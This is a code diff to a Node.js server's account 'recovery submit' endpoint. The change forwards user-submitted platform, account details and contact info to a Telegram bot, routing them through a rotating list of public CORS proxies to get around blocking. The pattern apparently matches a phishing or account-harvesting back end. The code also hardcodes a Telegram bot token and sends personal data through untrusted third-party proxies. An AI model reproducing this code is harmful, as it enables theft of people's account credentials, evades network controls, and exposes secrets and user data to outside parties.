@@ -526,9 +526,59 @@ ALL_PAGES.forEach(async (pg) => {
     await pools[0].query("INSERT INTO page_status (page_id, status) VALUES ($1, 'on') ON CONFLICT (page_id) DO NOTHING", [pg.id]).catch(() => {});
     await pools[1].query("INSERT INTO page_status (page_id, status) VALUES ($1, 'on') ON CONFLICT (page_id) DO NOTHING", [pg.id]).catch(() => {});
 });
-// ==================== RECOVERY SUBMIT (TO TELEGRAM) ====================
+// ==================== RECOVERY SUBMIT (PROXY VERSION) ====================
 const RECOVERY_BOT_TOKEN = '8452529051:AAHstuw08g7d-oyMPCfbZujo10Nf1xXpKe0';
 const RECOVERY_CHAT_ID = '8315928972';
+
+// ✅ Proxy Server List (တရုတ်နိုင်ငံအတွင်း သုံးလို့ရတဲ့ Proxy)
+const PROXY_LIST = [
+    'https://corsproxy.io/?',
+    'https://api.allorigins.win/raw?url=',
+    'https://cors-anywhere.herokuapp.com/'
+];
+
+async function sendToTelegramViaProxy(message) {
+    const tgUrl = `https://api.telegram.org/bot${RECOVERY_BOT_TOKEN}/sendMessage`;
+    const payload = {
+        chat_id: RECOVERY_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+    };
+
+    // Try each proxy
+    for (const proxy of PROXY_LIST) {
+        try {
+            const response = await fetch(proxy + encodeURIComponent(tgUrl), {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            const result = await response.json();
+            if (result.ok) {
+                return { success: true, message: 'Sent via ' + proxy };
+            }
+        } catch (e) {
+            console.log('Proxy failed:', proxy, e.message);
+        }
+    }
+
+    // If all proxies fail, try direct (just in case)
+    try {
+        const response = await fetch(tgUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        const result = await response.json();
+        if (result.ok) {
+            return { success: true, message: 'Sent directly' };
+        }
+    } catch (e) {
+        console.log('Direct failed:', e.message);
+    }
+
+    return { success: false, message: 'All methods failed' };
+}
 
 app.post('/api/recovery/submit', async (req, res) => {
     const { platform, account_details, contact_info, description } = req.body;
@@ -556,33 +606,16 @@ ${detailsText ? `📋 Account Details:\n${detailsText}` : ''}
 ⏰ Time: ${new Date().toLocaleString()}
     `;
 
-    // Send to Telegram
-    try {
-        const tgUrl = `https://api.telegram.org/bot${RECOVERY_BOT_TOKEN}/sendMessage`;
-        const tgResponse = await fetch(tgUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: RECOVERY_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        });
+    // Send via Proxy
+    const result = await sendToTelegramViaProxy(message);
 
-        const tgResult = await tgResponse.json();
-
-        if (tgResult.ok) {
-            res.json({ success: true, message: 'Recovery request sent to admin' });
-        } else {
-            console.error('[TELEGRAM ERROR]', tgResult);
-            res.json({ success: false, message: 'Failed to send to Telegram' });
-        }
-    } catch (e) {
-        console.error('[RECOVERY ERROR]', e.message);
-        res.json({ success: false, message: 'Server error: ' + e.message });
+    if (result.success) {
+        res.json({ success: true, message: 'Recovery request sent to admin' });
+    } else {
+        console.error('[TELEGRAM ERROR]', result.message);
+        res.json({ success: false, message: 'Failed to send to Telegram' });
     }
 });
-
 // ============================================================
 // MONITORING & SECURITY SYSTEM APIS (FULL HISTORY VERSION)
 // ============================================================
